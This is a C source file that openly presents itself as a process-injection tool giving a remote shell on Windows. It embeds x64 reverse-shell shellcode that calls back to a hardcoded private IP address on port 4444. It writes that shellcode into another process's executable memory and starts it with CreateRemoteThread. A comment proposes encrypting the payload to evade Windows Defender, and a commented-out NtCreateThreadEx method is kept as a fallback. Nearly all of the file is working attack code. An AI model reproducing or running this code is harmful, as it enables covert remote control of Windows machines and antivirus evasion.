/**

Author: Whusher 

===============   CODE INJECTION   =============

Description:
Advanced Remote shell for win system using a legitimate process PID

H@cking Skills

For payload creation review references in README.md file.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


// $$PAYLOAD$$ of previous reverse shell created
// 
// Comment:
// Here we can apply the obfuscation for windows defender such encrypt the payload 
// and unencrypt once the process is launched

unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x64\x8d"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";



// Forcing Thread creation
// typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
//     PHANDLE ThreadHandle,
//     ACCESS_MASK DesiredAccess,
//     PVOID ObjectAttributes,
//     HANDLE ProcessHandle,
//     PVOID StartRoutine,
//     PVOID Argument,
//     ULONG CreateFlags,
//     SIZE_T ZeroBits,
//     SIZE_T StackSize,
//     SIZE_T MaximumStackSize,
//     PVOID AttributeList
// );

                                                         

unsigned int payload_length = sizeof(payload);

int main(int argc, char* argv[]) {
    HANDLE process_handle = NULL;
    HANDLE remote_thread = NULL;
    PVOID remote_buffer = NULL;
    // DWORD bytes_written = 0; // For 32 bit
    SIZE_T bytes_written = 0; // For 64 bit
    DWORD thread_id = 0;
    
    // Check if PID argument was provided
    if (argc < 2) {
        printf("[!] Error: No process ID provided\n");
        printf("[*] Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    DWORD target_pid = (DWORD)atoi(argv[1]);
    printf("[+] Target Process ID: %d\n", target_pid);
    printf("[+] Payload size: %d bytes\n", payload_length);
    

    // Check if target has CFG
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {0};
    if (GetProcessMitigationPolicy(process_handle, ProcessControlFlowGuardPolicy, 
                                &cfg, sizeof(cfg))) {
        if (cfg.EnableControlFlowGuard) {
            printf("[!] Target has Control Flow Guard enabled\n");
        }
    }

    // Open the target process
    printf("[*] Opening target process...\n");
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    
    if (process_handle == NULL) {
        printf("[!] Error: OpenProcess failed with error code: %lu\n", GetLastError());
        printf("[*] Common errors:\n");
        printf("    - Error 5 (Access Denied): Run as Administrator or target process has higher privileges\n");
        printf("    - Error 87 (Invalid Parameter): Invalid PID\n");
        printf("    - Error 2 (File Not Found): Process doesn't exist\n");
        return 1;
    }
    printf("[+] Successfully opened process handle: 0x%p\n", process_handle);
    

    // Add after OpenProcess succeeds
    BOOL is_protected = FALSE;
    typedef BOOL (WINAPI *IsProtectedProcess_t)(HANDLE);
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    IsProtectedProcess_t IsProtectedProcess = 
        (IsProtectedProcess_t)GetProcAddress(kernel32, "IsProtectedProcess");

    if (IsProtectedProcess && IsProtectedProcess(process_handle)) {
        printf("[!] Warning: Target is a protected process\n");
    }

    // Check process integrity level
    HANDLE token;
    if (OpenProcessToken(process_handle, TOKEN_QUERY, &token)) {
        DWORD length;
        GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &length);
        TOKEN_MANDATORY_LABEL* label = (TOKEN_MANDATORY_LABEL*)malloc(length);
        if (GetTokenInformation(token, TokenIntegrityLevel, label, length, &length)) {
            DWORD integrity = *GetSidSubAuthority(label->Label.Sid, 
                            *GetSidSubAuthorityCount(label->Label.Sid) - 1);
            printf("[*] Target process integrity level: 0x%x\n", integrity);
            // 0x1000 = Low, 0x2000 = Medium, 0x3000 = High, 0x4000 = System
        }
        free(label);
        CloseHandle(token);
    }

    // Allocate memory in the target process
    printf("[*] Allocating memory in target process...\n");
    remote_buffer = VirtualAllocEx(process_handle, NULL, payload_length, 
                                   (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    if (remote_buffer == NULL) {
        printf("[!] Error: VirtualAllocEx failed with error code: %lu\n", GetLastError());
        CloseHandle(process_handle);
        return 1;
    }
    printf("[+] Successfully allocated memory at address: 0x%p\n", remote_buffer);
    
    // Write payload to the target process
    printf("[*] Writing payload to target process...\n");
    BOOL write_result = WriteProcessMemory(process_handle, remote_buffer, payload, 
                                          payload_length, &bytes_written);
    
    if (!write_result) {
        printf("[!] Error: WriteProcessMemory failed with error code: %lu\n", GetLastError());
        VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return 1;
    }
    printf("[+] Successfully wrote %lu bytes to target process\n", bytes_written);
    
    if (bytes_written != payload_length) {
        printf("[!] Warning: Only wrote %lu bytes out of %d\n", bytes_written, payload_length);
    }
    
    // Create remote thread to execute payload
    printf("[*] Creating remote thread...\n");
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, 
                                      (LPTHREAD_START_ROUTINE)remote_buffer, 
                                      NULL, 0, &thread_id);
    
    if (remote_thread == NULL) {
        printf("[!] Error: CreateRemoteThread failed with error code: %lu\n", GetLastError());
        VirtualFreeEx(process_handle, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process_handle);
        return 1;
    }

    // Use second method

    // HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    // NtCreateThreadEx_t NtCreateThreadEx = 
    //     (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");

    // if (NtCreateThreadEx) {
    //     printf("[*] Trying NtCreateThreadEx...\n");
    //     NTSTATUS status = NtCreateThreadEx(
    //         &remote_thread,
    //         THREAD_ALL_ACCESS,
    //         NULL,
    //         process_handle,
    //         (LPTHREAD_START_ROUTINE)remote_buffer,
    //         NULL,
    //         0,
    //         0,
    //         0,
    //         0,
    //         NULL
    //     );
        
    //     if (status == 0) {
    //         printf("[+] NtCreateThreadEx succeeded!\n");
    //     } else {
    //         printf("[!] NtCreateThreadEx failed: 0x%x\n", status);
    //         return 1;
    //     }
    // }


    printf("[+] Successfully created remote thread with TID: %lu\n", thread_id);
    printf("[+] Thread handle: 0x%p\n", remote_thread);
    
    // Wait for the thread to finish (optional, for debugging)
    printf("[*] Waiting for remote thread to execute...\n");
    WaitForSingleObject(remote_thread, 5000); // Wait up to 5 seconds
    
    DWORD exit_code;
    if (GetExitCodeThread(remote_thread, &exit_code)) {
        if (exit_code == STILL_ACTIVE) {
            printf("[+] Thread is still running\n");
        } else {
            printf("[+] Thread exited with code: %lu\n", exit_code);
        }
    }
    
    // Clean up
    printf("[*] Cleaning up...\n");
    CloseHandle(remote_thread);
    CloseHandle(process_handle);
    
    printf("[+] Injection completed successfully!\n");
    return 0;
}